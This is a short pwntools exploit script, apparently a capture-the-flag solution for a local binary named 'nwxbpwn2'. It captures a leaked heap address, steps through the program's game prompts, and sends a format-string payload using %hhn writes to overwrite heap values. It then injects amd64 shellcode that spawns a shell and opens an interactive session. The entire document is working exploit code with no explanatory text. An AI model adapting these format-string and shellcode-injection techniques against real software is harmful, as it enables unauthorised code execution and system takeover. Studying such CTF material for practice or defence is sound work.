from pwn import *

def debugf():
	gdb.attach(p,"b printf")

p = process("./nwxbpwn2")
context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
p.recvuntil("secret[0] is ")
heap_addr = int(p.recvuntil("\n",drop = True),16)
log.success("heap_addr:"+hex(heap_addr))
name = "a"*0xb
p.sendlineafter("What should your character's name be:\n",name)
p.sendlineafter("east or up?:\n","east")
p.sendlineafter("go into there(1), or leave(0)?:\n","1")
p.sendlineafter("'Give me an address'\n","1")
#debugf()
payload = "%12$hhn%13$hhn".ljust(0x20,"a") + p64(heap_addr) + p64(heap_addr + 4)
p.sendlineafter("And, you wish is:\n",payload)
context.bits = 64
context.arch = "amd64"
sc = asm(shellcraft.sh())
p.sendafter("Wizard: I will help you! USE YOU SPELL\n",sc.ljust(0x100,"\x90"))
p.interactive()
